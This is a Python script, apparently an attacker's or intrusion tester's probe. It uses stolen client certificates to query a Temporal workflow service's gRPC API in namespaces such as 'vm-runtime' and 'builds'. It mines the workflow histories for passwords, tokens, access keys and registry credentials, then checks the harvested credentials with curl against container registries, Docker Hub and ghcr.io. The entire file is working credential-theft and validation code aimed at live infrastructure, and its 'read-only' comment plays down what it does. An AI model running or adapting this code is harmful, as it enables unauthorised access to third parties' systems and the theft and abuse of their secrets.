#!/usr/bin/env python3
# I67851 probe2: vm-runtime (builder VM / image layer) workflow payload extraction
# + one-shot registry basic-auth validation (read-only, no pull/push).
import subprocess, struct, json, sys, os, time, re, base64
src = open('/p.py').read().split("print('===I67851 START")[0]
ns = {}
exec(src, ns)
grpc_call = ns['grpc_call']; fs = ns['fs']; fv = ns['fv']; fmsg = ns['fmsg']
all_of = ns['all_of']; get1 = ns['get1']; frame_payload = ns['frame_payload']; jsons_from = ns['jsons_from']
T = '/temporal.api.workflowservice.v1.WorkflowService/'
CF, CK, CA = '/pki/client.crt', '/pki/client.key', '/pki/server-ca-bundle.crt'

print('===I67851-P2 START===', flush=True)


def list_execs(ns_, q='', size=10):
    r = grpc_call(T + 'ListWorkflowExecutions', fs(1, ns_) + fv(2, size) + (fs(4, q) if q else b''), timeout=20)
    out = []
    if r['st'] != '0':
        return out, r['st']
    for ei in all_of(frame_payload(r['data']), 1):
        ex = get1(ei, 1) or b''
        wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        if wid:
            out.append((wid, rid, ty))
    return out, '0'


def hist(ns_, wid, rid):
    req = fs(1, ns_) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20)
    r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=30)
    if r['st'] != '0':
        return None
    return frame_payload(r['data'])


def walk(o, path, out):
    if isinstance(o, dict):
        for k, v in o.items():
            p = (path + '.' + k) if path else k
            kl = k.lower()
            if isinstance(v, str) and kl in ('imageref', 'imagedigestref', 'digest', 'layerref', 'path', 'source',
                                             'ondiskpath', 'filename', 'mediatype', 'format', 'registry', 'host',
                                             'username', 'password', 'accesskey', 'secretkey', 'endpoint',
                                             'bucketname', 'objectpath', 'urischeme', 'storedtoken', 'storetoken',
                                             'grpcproxy', 'command', 'entrypoint', 'token', 'cert', 'certpath',
                                             'username', 'url'):
                key = (p.lower(), v)
                if key not in out[1]:
                    out[1].add(key)
                    out[0].append((p, v))
            walk(v, p, out)
    elif isinstance(o, list):
        for it in o[:5]:
            walk(it, path, out)


def reg_test(host, user, pw, tag):
    if not host or not user or not pw:
        return
    h = host.strip()
    if '://' in h:
        h = h.split('://', 1)[1]
    h = h.split('/')[0]
    args = ['curl', '-sS', '--connect-timeout', '5', '-m', '12', '-o', '/dev/null', '-w', '%{http_code}',
            '--cert', CF, '--key', CK, '--cacert', CA, '-u', '%s:%s' % (user, pw), 'https://%s/v2/' % h]
    p = subprocess.run(args, capture_output=True, text=True)
    print('REG|%s|host=%s|user=%s|code=%s|err=%s' % (tag, h, user[:24], p.stdout.strip(), (p.stderr or '')[:60]), flush=True)


# --- vm-runtime: all workflow types overview ---
ex, st = list_execs('vm-runtime', '', 20)
types = {}
for w, r, t in ex:
    types[t] = types.get(t, 0) + 1
print('VM_TYPES|st=%s|%s' % (st, ','.join('%s=%d' % (k, v) for k, v in sorted(types.items()))), flush=True)

sel = []
for t in ['CreateVmWorkflow', 'PullImageLayerWorkflow']:
    e, _ = list_execs('vm-runtime', 'WorkflowType="%s"' % t, 2)
    for x in e[:1]:
        sel.append(('vm-runtime', x, t))
sb, _ = list_execs('builds', 'WorkflowType="SnapshotAndBuild"', 2)
if sb:
    sel.append(('builds', sb[0], 'SnapshotAndBuild'))

creds = []
for ns_, (wid, rid, ty), tag in sel:
    pl = hist(ns_, wid, rid)
    if pl is None:
        print('H|%s|%s|FAIL' % (tag, wid[:30]), flush=True)
        continue
    js = jsons_from(pl, 10)
    print('H|%s|len=%d|json=%d' % (tag, len(pl), len(js)), flush=True)
    out = ([], set())
    for j in js:
        walk(j, '', out)
        if isinstance(j, dict):
            for kk in ('identifiers', 'Identifiers'):
                if isinstance(j.get(kk), dict):
                    print('   ID|' + ','.join('%s=%s' % (a, str(b)[:40]) for a, b in list(j[kk].items())[:6]), flush=True)
            if isinstance(j.get('image'), dict):
                im = j['image']
                print('   IMG|ref=%s|digest=%s|rc=%s' % (str(im.get('imageRef'))[:80], str(im.get('digest'))[:60],
                      'yes' if im.get('registryCredentials') else 'no'), flush=True)
                rcm = im.get('registryCredentials') or {}
                if isinstance(rcm, dict):
                    creds.append((rcm.get('host') or rcm.get('registry') or '', rcm.get('username') or '',
                                  rcm.get('password') or '', tag + '/image'))
    cnt = 0
    for p, v in out[0]:
        pl2 = p.lower()
        if ('credential' in pl2 or 'imageref' in pl2 or 'bucket' in pl2 or 'objectpath' in pl2
                or 'storetoken' in pl2 or 'grpcproxy' in pl2 or pl2.endswith('.source') or pl2.endswith('.path')):
            print('   R|%s|%s' % (p, v[:240]), flush=True)
            cnt += 1
            if cnt > 40:
                break
    # collect registry creds explicitly
    for j in js:
        def find(o, p):
            if isinstance(o, dict):
                for k, v in o.items():
                    if k.lower() in ('registrycredentials', 'readonlyregistrycredentials') and isinstance(v, dict):
                        creds.append((v.get('host') or '', v.get('username') or '', v.get('password') or '', tag + '/' + p + '.' + k))
                    find(v, p + '.' + k)
            elif isinstance(o, list):
                for it in o[:3]:
                    find(it, p)
        find(j, '')

print('===REG TESTS===', flush=True)
seen = set()
for h, u, pw, tag in creds:
    if not pw:
        continue
    k = (h, u, pw)
    if k in seen:
        continue
    seen.add(k)
    reg_test(h, u, pw, tag)

# dockerhub/ghcr token exchange validation (GET only)
def token_test(host, authhost, service, user, pw, tag):
    args = ['curl', '-sS', '-m', '15', '-u', '%s:%s' % (user, pw), '-o', '/dev/null', '-w', '%{http_code}',
            'https://%s/token?service=%s&scope=repository:library/alpine:pull' % (authhost, service)]
    p = subprocess.run(args, capture_output=True, text=True)
    print('TOK|%s|%s|code=%s' % (tag, host, p.stdout.strip()), flush=True)


for h, u, pw, tag in creds:
    if 'docker.io' in h:
        token_test('registry-1.docker.io', 'auth.docker.io', 'registry.docker.io', u, pw, tag)
    if 'ghcr.io' in h:
        args = ['curl', '-sS', '-m', '15', '-u', '%s:%s' % (u, pw), '-o', '/dev/null', '-w', '%{http_code}',
                'https://ghcr.io/token?service=ghcr.io&scope=repository:railwayapp/alpine:pull']
        p = subprocess.run(args, capture_output=True, text=True)
        print('TOK|ghcr.io|code=%s' % p.stdout.strip(), flush=True)
print('===I67851-P2 END===', flush=True)
